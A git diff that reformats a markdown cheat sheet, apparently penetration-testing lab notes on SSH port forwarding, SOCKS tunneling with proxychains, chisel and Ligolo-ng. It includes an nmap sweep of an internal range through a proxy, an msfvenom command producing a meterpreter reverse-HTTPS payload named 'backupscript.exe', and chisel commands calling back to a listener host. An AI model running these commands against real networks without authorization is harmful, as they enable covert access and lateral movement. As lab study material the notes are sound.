@@ -2,23 +2,21 @@
 layout: default
 ---
 
-# Pivoting, Tunneling, and Port Forwarding
+# Dynamic Port Forwarding with SSH and SOCKS Tunneling
 ## SSH Local Port Forwarding
-Forward port 3306 from 10.129.202.64 to localhost 1234
-```
+```bash
+# Forward port 3306 from 10.129.202.64 to localhost 1234
 $ ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
-```
 
-```
 $ ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
 ```
 
-### Enabling Dynamic Port Forwarding with SSH
-```
+## Dynamic Port Forwarding
+```bash
 $ ssh -D 9050 ubuntu@10.129.202.64
 ```
 
-```
+```bash
 $ tail -4 /etc/proxychains.conf
 
 # meanwile
@@ -26,12 +24,12 @@ $ tail -4 /etc/proxychains.conf
 socks4 	127.0.0.1 9050
 ```
 
-```
+```bash
 $ proxychains nmap -v -sn 172.16.5.1-200
 ```
 
 ## Remote/Reverse Port Forwarding with SSH
-```
+```bash
 $ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
 ```
 
@@ -91,8 +89,7 @@ $ chisel server --socks5 --reverse`
 ./chisel client --fingerprint f9KLbYov18MaH86fvgZhbVMyTAj4LAT6Iv8E8Nlwy0k= 10.10.15.23:8080 R:8081:127.0.0.1:445
 ```
 
-## Pivoting
-### [Ligolo-ng](https://github.com/nicocha30/ligolo-ng)
+# [Ligolo-ng](https://github.com/nicocha30/ligolo-ng)
 
 [Guide](https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740)
 [Video](https://www.youtube.com/watch?v=qou7shRlX_s)
